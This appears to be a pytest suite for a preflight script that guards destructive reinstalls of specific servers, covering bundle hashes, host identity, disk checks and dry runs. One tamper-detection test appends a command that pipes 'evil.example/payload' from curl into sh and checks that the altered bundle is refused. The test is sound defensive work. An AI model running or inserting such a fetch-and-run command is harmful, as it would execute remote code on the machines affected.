"""Offline and fake-command coverage for the destructive reinstall preflight."""

from __future__ import annotations

import importlib.util
import io
import json
import shlex
import sys
from pathlib import Path

import pytest


NETCUP_DIR = Path(__file__).resolve().parents[1]
PREFLIGHT_PATH = NETCUP_DIR / "pre-reinstall.py"


def _load_preflight():
    spec = importlib.util.spec_from_file_location("netcup_pre_reinstall_preflight", PREFLIGHT_PATH)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    try:
        spec.loader.exec_module(module)
    except BaseException:
        sys.modules.pop(spec.name, None)
        raise
    return module


def _build_valid_inputs(tmp_path: Path, *, host="v1001"):
    preflight = _load_preflight()
    package_root = NETCUP_DIR.parent / "debian-install-v2"
    import sys

    sys.path.insert(0, str(package_root))
    try:
        from debian_install_v2.config import load_config
        from debian_install_v2.customscript import build_customscript_bundle
    finally:
        sys.path.remove(str(package_root))

    config_path = NETCUP_DIR / "examples" / "debian-install-v2" / f"{host}.json"
    config = load_config(str(config_path))
    bundle = build_customscript_bundle(
        config, repo_branch="main", controller_ssh_placeholder=True
    )
    bundle_path = tmp_path / f"{host}-bundle.json"
    # This is the exact formatting used by cli_extended Output.primary_json,
    # which is what build-customscript redirects to the bundle file.
    bundle_path.write_text(json.dumps(bundle) + "\n", encoding="utf-8")
    return preflight, config_path, bundle_path


def test_preflight_validates_config_bundle_offline_plan_and_sha256(tmp_path):
    preflight, config_path, bundle_path = _build_valid_inputs(tmp_path)
    checked = preflight.validate_bundle(
        "v1001", config_path, bundle_path,
        disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
        repo_branch="main",
    )
    assert checked.digest == preflight.sha256_file(bundle_path)
    assert checked.plan["plan_table"][0]["start"] == 2_500_608
    assert [row["number"] for row in checked.plan["plan_table"]] == list(range(3, 10))


def test_preflight_refuses_embedded_config_that_differs_from_validated_bundle(tmp_path):
    preflight, config_path, bundle_path = _build_valid_inputs(tmp_path)
    bundle = json.loads(bundle_path.read_text(encoding="utf-8"))
    embedded = dict(bundle["config"])
    embedded["run_docker_install"] = False
    bundle["customScript"] = (
        "REPO_BRANCH=main VBPUB_CONFIG_EXTRA_JSON="
        + shlex.quote(json.dumps(embedded, sort_keys=True, separators=(",", ":")))
        + " python3 -c pass"
    )
    bundle_path.write_text(json.dumps(bundle), encoding="utf-8")

    with pytest.raises(preflight.PreflightError, match="embedded config does not match"):
        preflight.validate_bundle(
            "v1001", config_path, bundle_path,
            disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
            repo_branch="main",
        )


@pytest.mark.parametrize(
    ("key", "value"),
    [
        ("root_max_size_gb", 40),
        ("root_resize_policy", "grow"),
        ("disk_layout", "dev-host"),
    ],
)
def test_preflight_refuses_stale_payload_bundle_before_submit(tmp_path, key, value):
    preflight, config_path, _bundle_path = _build_valid_inputs(tmp_path)
    stale = json.loads(config_path.read_text(encoding="utf-8"))
    stale[key] = value
    stale_config_path = tmp_path / "stale.json"
    stale_config_path.write_text(json.dumps(stale), encoding="utf-8")
    stale_bundle_path = tmp_path / "stale-bundle.json"
    stale_bundle_path.write_text(json.dumps({
        "config": stale,
        "customScript": "REPO_BRANCH=main VBPUB_CONFIG_EXTRA_JSON='" + json.dumps(stale) + "' python3 -c pass",
        "completionMarker": "/var/lib/vbpub/bootstrap/stage2_done",
    }), encoding="utf-8")

    calls = []
    run_dir = tmp_path / "stale-run"
    with pytest.raises(preflight.PreflightError, match="strict v2 config validation"):
        preflight.run_reinstall(
            "v1001", stale_config_path, stale_bundle_path,
            disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
            repo_branch="main", run_dir=run_dir,
            ssh_key_ids=[31415], expected_bundle_sha256=preflight.sha256_file(stale_bundle_path),
            expected_commit="a" * 40, commit_lookup=lambda branch: "a" * 40,
            runner=lambda *args, **kwargs: calls.append((args, kwargs)),
        )
    assert calls == []
    log = (run_dir / "reinstall.log").read_text(encoding="utf-8")
    assert "strict v2 config validation" in log
    assert "EXIT=2" in log
    assert (run_dir / "reinstall.log.EXIT").read_text(encoding="utf-8").strip() == "2"


@pytest.mark.parametrize("host", ["r1002", "v1001"])
def test_identity_guards_check_api_and_ssh_host_facts(host):
    preflight = _load_preflight()
    expected = preflight.HOSTS[host]
    record = {
        "id": expected.server_id,
        "name": expected.server_name,
        "hostname": expected.hostname,
        "ipv4Addresses": [{"ip": expected.ipv4}],
        "serverLiveInfo": {"state": "RUNNING", "disks": [{"dev": "vda"}]},
    }
    assert preflight.validate_ssh_identity(
        host,
        f"{expected.hostname}\n{expected.short_name}\n{expected.server_id}\nvda\n",
    ) is None
    command = preflight._remote_identity_command(host, 3)
    assert "set -e" in command
    api_check = "r1002_api_check" if host == "r1002" else "v1001_api_check"
    ssh_function = "r1002_ssh" if host == "r1002" else "v1001_ssh"
    assert command.index(api_check) < command.index(ssh_function)

    assert 'test "$(hostname -f)" = ' + expected.hostname in command
    assert 'test "$(cat /etc/vbpub/server-id)" = ' + str(expected.server_id) in command
    with pytest.raises(preflight.PreflightError, match="SSH identity mismatch"):
        preflight.validate_ssh_identity(host, "wrong.example\nwrong\n1\nvda\n")


def test_provider_payload_guard_checks_target_image_disk_and_customscript():
    preflight = _load_preflight()
    expected = preflight.HOSTS["v1001"]
    payload = {
        "serverId": expected.server_id,
        "hostname": expected.hostname,
        "imageFlavourId": expected.image_id,
        "diskName": "vda",
        "sshKeyIds": [],
        "customScript": "reviewed customScript",
    }
    assert preflight.validate_provider_payload(
        "v1001", payload, expected_custom_script="reviewed customScript", expected_ssh_key_ids=[]
    ) is None
    for key, value in (
        ("serverId", expected.server_id + 1),
        ("hostname", "wrong.example"),
        ("imageFlavourId", expected.image_id + 1),
        ("diskName", "vdb"),
        ("customScript", "stale script"),
    ):
        bad = dict(payload)
        bad[key] = value
        with pytest.raises(preflight.PreflightError, match="provider payload mismatch"):
            preflight.validate_provider_payload(
                "v1001", bad, expected_custom_script="reviewed customScript", expected_ssh_key_ids=[]
            )


@pytest.mark.parametrize("status", [0, 17])
def test_run_log_always_records_exit_status(tmp_path, status):
    preflight = _load_preflight()
    log_path = tmp_path / "v1001" / "reinstall.log"
    exit_path = preflight.run_logged(log_path, lambda log: status)
    assert exit_path == status
    assert f"EXIT={status}" in log_path.read_text(encoding="utf-8")
    assert (log_path.with_suffix(log_path.suffix + ".EXIT")).read_text(encoding="utf-8").strip() == str(status)


def test_run_guard_order_and_image_pin_are_explicit_in_submitted_argv(tmp_path):
    preflight, config_path, bundle_path = _build_valid_inputs(tmp_path)
    seen = []
    runner, base_popen = _successful_run_helpers(preflight, bundle_path)

    def fake_run(argv, **kwargs):
        seen.append((argv, kwargs))
        command = argv[-1]
        assert command.index("v1001_api_check") < command.index("v1001_ssh")
        return runner(argv, **kwargs)

    wizard_calls = []

    def fake_popen(argv, **kwargs):
        wizard_calls.append(argv)
        return base_popen(argv, **kwargs)

    result = preflight.run_reinstall(
        "v1001", config_path, bundle_path,
        disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
        run_dir=tmp_path / "run", runner=fake_run, popen_factory=fake_popen,
        ssh_key_ids=[31415], expected_bundle_sha256=preflight.sha256_file(bundle_path),
        expected_commit="a" * 40, commit_lookup=lambda branch: "a" * 40,
    )
    assert result == 0
    assert len(seen) == 1
    assert len(wizard_calls) == 2
    assert "--dry-run" in wizard_calls[0]
    assert "--yes" in wizard_calls[1]
    assert "--image" in wizard_calls[1] and wizard_calls[1][wizard_calls[1].index("--image") + 1] == "128"
    assert wizard_calls[1].count("--ssh-key-id") == 1
    log = (tmp_path / "run" / "reinstall.log").read_text(encoding="utf-8")
    assert "START=" in log and "EXIT=0" in log
    assert "BUNDLE_SHA256=" in log and "REMOTE_COMMIT=" in log
    assert (tmp_path / "run" / "bundle.sha256").is_file()


def test_preflight_dry_run_records_plan_and_never_submits_consent(tmp_path):
    preflight, config_path, bundle_path = _build_valid_inputs(tmp_path)
    seen = []
    runner, base_popen = _successful_run_helpers(preflight, bundle_path)

    def fake_run(argv, **kwargs):
        seen.append(argv)
        return runner(argv, **kwargs)

    wizard_calls = []

    def fake_popen(argv, **kwargs):
        wizard_calls.append(argv)
        return base_popen(argv, **kwargs)

    result = preflight.run_reinstall(
        "v1001", config_path, bundle_path,
        disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
        run_dir=tmp_path / "preview", dry_run=True, runner=fake_run,
        ssh_key_ids=[31415], expected_commit="a" * 40,
        commit_lookup=lambda branch: "a" * 40, popen_factory=fake_popen,
    )
    assert result == 0
    assert len(seen) == 1
    assert len(wizard_calls) == 1 and "--dry-run" in wizard_calls[0] and "--yes" not in wizard_calls[0]
    log = (tmp_path / "preview" / "reinstall.log").read_text(encoding="utf-8")
    assert "[dry-run] Preflight OK" in log
    assert f"BUNDLE_SHA256={preflight.sha256_file(bundle_path)}" in log
    assert "EXIT=0" in log
    assert (tmp_path / "preview" / "bundle.sha256").is_file()


def test_ssh_identity_refusal_never_runs_wizard(tmp_path):
    preflight, config_path, bundle_path = _build_valid_inputs(tmp_path)
    calls = []

    def fake_run(argv, **kwargs):
        calls.append(argv)
        return preflight.CommandResult(
            0,
            "wrong.example\nwrong\n0\nvda\n549755813888\n2500608\n",
            "",
        )

    with pytest.raises(preflight.PreflightError, match="SSH identity mismatch"):
        preflight.run_reinstall(
            "v1001", config_path, bundle_path,
            disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
            run_dir=tmp_path / "run", runner=fake_run,
            ssh_key_ids=[31415], expected_bundle_sha256=preflight.sha256_file(bundle_path),
            expected_commit="a" * 40,
            commit_lookup=lambda branch: "a" * 40,
        )
    assert len(calls) == 1
    assert "--yes" not in calls[0]


def _expected_payload(preflight, bundle_path, host="v1001", ssh_key_ids=(31415,)):
    expected = preflight.HOSTS[host]
    bundle = json.loads(bundle_path.read_text(encoding="utf-8"))
    return {
        "serverId": expected.server_id,
        "hostname": expected.hostname,
        "imageFlavourId": expected.image_id,
        "diskName": "vda",
        "sshKeyIds": list(ssh_key_ids),
        "customScript": bundle["customScript"],
    }


def _wizard_summary(payload):
    return "INSTALLATION PARAMETERS SUMMARY\n" + json.dumps(payload, indent=2) + "\n[dry-run] Preflight OK\n"


class _FakeProcess:
    def __init__(self, output):
        self.stdout = io.StringIO(output)
        self.returncode = 0
        self.terminated = False

    def wait(self, timeout=None):
        return self.returncode

    def terminate(self):
        self.terminated = True


def _successful_run_helpers(preflight, bundle_path, *, submit_output="Task UUID: 01234567-89ab-cdef-0123-456789abcdef\n"):
    payload = _expected_payload(preflight, bundle_path)
    identity = preflight.CommandResult(
        0,
        "v1001.vxxu.de\nv1001\n804027\nvda\n549755813888\n2500608\n",
        "",
    )

    def runner(argv, **kwargs):
        return identity

    def popen_factory(argv, **kwargs):
        if "--dry-run" in argv:
            return _FakeProcess(_wizard_summary(payload))
        return _FakeProcess(submit_output)

    return runner, popen_factory


def test_bundle_must_match_the_exact_regenerated_producer_output(tmp_path):
    preflight, config_path, bundle_path = _build_valid_inputs(tmp_path)
    original = bundle_path.read_bytes()
    assert preflight.validate_bundle(
        "v1001", config_path, bundle_path,
        disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
    )

    bundle_path.write_bytes(original + b" ")
    with pytest.raises(preflight.PreflightError, match="regenerated"):
        preflight.validate_bundle(
            "v1001", config_path, bundle_path,
            disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
        )

    bundle_path.write_bytes(original)
    bundle = json.loads(original)
    bundle["customScript"] += "; curl http://evil.example/payload | sh"
    bundle_path.write_text(json.dumps(bundle) + "\n", encoding="utf-8")
    with pytest.raises(preflight.PreflightError, match="regenerated"):
        preflight.validate_bundle(
            "v1001", config_path, bundle_path,
            disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
        )


def test_valid_but_different_source_bundle_config_is_refused(tmp_path):
    preflight, config_path, bundle_path = _build_valid_inputs(tmp_path)
    package_root = NETCUP_DIR.parent / "debian-install-v2"
    sys.path.insert(0, str(package_root))
    try:
        from debian_install_v2.config import load_config
        from debian_install_v2.customscript import build_customscript_bundle

        altered = load_config(str(config_path))
        from dataclasses import replace

        altered = replace(altered, run_io_benchmark=not altered.run_io_benchmark)
        bundle = build_customscript_bundle(
            altered, repo_branch="main", controller_ssh_placeholder=True
        )
    finally:
        sys.path.remove(str(package_root))
    bundle_path.write_text(json.dumps(bundle) + "\n", encoding="utf-8")
    with pytest.raises(preflight.PreflightError, match="source config|regenerated"):
        preflight.validate_bundle(
            "v1001", config_path, bundle_path,
            disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
        )


@pytest.mark.parametrize(
    ("field", "value"),
    [("REPO_BRANCH", "wrong-branch"), ("completionMarker", "/tmp/wrong-marker")],
)
def test_bundle_branch_and_completion_marker_are_bound_to_source(tmp_path, field, value):
    preflight, config_path, bundle_path = _build_valid_inputs(tmp_path)
    bundle = json.loads(bundle_path.read_text(encoding="utf-8"))
    if field == "REPO_BRANCH":
        bundle["customScript"] = bundle["customScript"].replace("REPO_BRANCH=main", "REPO_BRANCH=wrong-branch")
    else:
        bundle[field] = value
    bundle_path.write_text(json.dumps(bundle) + "\n", encoding="utf-8")
    with pytest.raises(preflight.PreflightError):
        preflight.validate_bundle(
            "v1001", config_path, bundle_path,
            disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
        )


@pytest.mark.parametrize(
    ("actual_bytes", "actual_start"),
    [(549755813887, 2500608), (549755813888, 2500609)],
)
def test_live_disk_mismatch_prevents_even_dry_run_wizard(tmp_path, actual_bytes, actual_start):
    preflight, config_path, bundle_path = _build_valid_inputs(tmp_path)
    calls = []

    def runner(argv, **kwargs):
        calls.append(argv)
        return preflight.CommandResult(
            0,
            f"v1001.vxxu.de\nv1001\n804027\nvda\n{actual_bytes}\n{actual_start}\n",
            "",
        )

    with pytest.raises(preflight.PreflightError, match="live disk mismatch"):
        preflight.run_reinstall(
            "v1001", config_path, bundle_path,
            disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
            run_dir=tmp_path / "run", runner=runner,
            ssh_key_ids=[31415], expected_bundle_sha256=preflight.sha256_file(bundle_path),
            expected_commit="a" * 40,
            commit_lookup=lambda branch: "a" * 40,
            popen_factory=lambda *args, **kwargs: pytest.fail("wizard must not run"),
        )
    assert len(calls) == 1


def test_real_wizard_dry_run_payload_is_checked_before_submit(tmp_path):
    preflight, config_path, bundle_path = _build_valid_inputs(tmp_path)
    runner, popen_factory = _successful_run_helpers(preflight, bundle_path)
    expected = _expected_payload(preflight, bundle_path)
    expected["imageFlavourId"] = 127
    calls = []

    def record_popen(argv, **kwargs):
        calls.append(argv)
        return _FakeProcess(_wizard_summary(expected))

    with pytest.raises(preflight.PreflightError, match="provider payload mismatch"):
        preflight.run_reinstall(
            "v1001", config_path, bundle_path,
            disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
            run_dir=tmp_path / "run", runner=runner,
            ssh_key_ids=[31415], expected_bundle_sha256=preflight.sha256_file(bundle_path),
            expected_commit="a" * 40,
            commit_lookup=lambda branch: "a" * 40,
            popen_factory=record_popen,
        )
    assert len(calls) == 1
    assert "--dry-run" in calls[0]
    assert "--yes" not in calls[0]


def test_yes_run_requires_reviewed_bundle_hash_and_expected_remote_commit(tmp_path):
    preflight, config_path, bundle_path = _build_valid_inputs(tmp_path)
    runner, popen_factory = _successful_run_helpers(preflight, bundle_path)
    calls = []

    with pytest.raises(preflight.PreflightError, match="--expect-bundle-sha256"):
        preflight.run_reinstall(
            "v1001", config_path, bundle_path,
            disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
            run_dir=tmp_path / "missing-hash", runner=lambda *a, **k: calls.append(a),
            ssh_key_ids=[31415], expected_commit="a" * 40,
            commit_lookup=lambda branch: "a" * 40,
        )
    assert calls == []

    with pytest.raises(preflight.PreflightError, match="remote branch commit"):
        preflight.run_reinstall(
            "v1001", config_path, bundle_path,
            disk_size="512GiB", root_start_sector=2_500_608, root_number=3,
            run_dir=tmp_path / "wrong-commit", runner=runner,
            ssh_key_ids=[31415], expected_bundle_sha256=preflight.sha256_file(bundle_path),
            expected_commit="a" * 40, commit_lookup=lambda branch: "b" * 40,
            popen_factory=popen_factory,
        )


def test_wizard_argv_uses_explicit_ssh_key_ids_and_reviewed_commit_hash(tmp_path):
    preflight = _load_preflight()
    argv = preflight._wizard_argv(
        "v1001", tmp_path / "bundle.json", tmp_path / "run",
        ssh_key_ids=[31415, 27182], dry_run=False,
    )
    assert argv.count("--ssh-key-id") == 2
    assert argv[argv.index("--ssh-key-id") + 1] == "31415"
    assert argv[argv.index("--ssh-key-id", argv.index("--ssh-key-id") + 1) + 1] == "27182"


def test_wizard_stream_logs_task_id_immediately_and_interrupt_prints_follow_up(tmp_path, capsys):
    preflight = _load_preflight()

    class InterruptAfterTaskId:
        def __iter__(self):
            yield "Task UUID: 01234567-89ab-cdef-0123-456789abcdef\n"
            raise KeyboardInterrupt

    process = _FakeProcess("")
    process.stdout = InterruptAfterTaskId()
    with (tmp_path / "reinstall.log").open("w", encoding="utf-8") as log:
        with pytest.raises(KeyboardInterrupt):
            preflight._stream_wizard(
                ["python3", "install-host.py", "wizard", "--yes"],
                log=log,
                task_state_path=tmp_path / "task-id",
                popen_factory=lambda *args, **kwargs: process,
            )
    log_text = (tmp_path / "reinstall.log").read_text(encoding="utf-8")
    assert "TASK_ID=01234567-89ab-cdef-0123-456789abcdef" in log_text
    state = (tmp_path / "task-id").read_text(encoding="utf-8")
    assert "task_id=01234567-89ab-cdef-0123-456789abcdef" in state
    assert "monitor-task.py watch 01234567-89ab-cdef-0123-456789abcdef" in state
    captured = capsys.readouterr()
    output = captured.out + captured.err
    assert "01234567-89ab-cdef-0123-456789abcdef" in output
    assert "monitor-task.py watch 01234567-89ab-cdef-0123-456789abcdef" in output


def test_wizard_stream_is_visible_live_and_inherits_no_operator_prompt_input(tmp_path, capsys):
    preflight = _load_preflight()
    seen = {}
    process = _FakeProcess("visible wizard progress\n")

    def popen_factory(argv, **kwargs):
        seen.update(kwargs)
        return process

    with (tmp_path / "reinstall.log").open("w", encoding="utf-8") as log:
        result = preflight._stream_wizard(
            ["python3", "install-host.py", "wizard", "--yes"],
            log=log,
            task_state_path=tmp_path / "task-id",
            popen_factory=popen_factory,
        )

    assert result.returncode == 0
    assert "visible wizard progress" in capsys.readouterr().out
    assert "visible wizard progress" in (tmp_path / "reinstall.log").read_text(encoding="utf-8")
    assert seen["stdin"] is preflight.subprocess.DEVNULL
    assert seen["stdout"] is preflight.subprocess.PIPE
    assert seen["stderr"] is preflight.subprocess.STDOUT
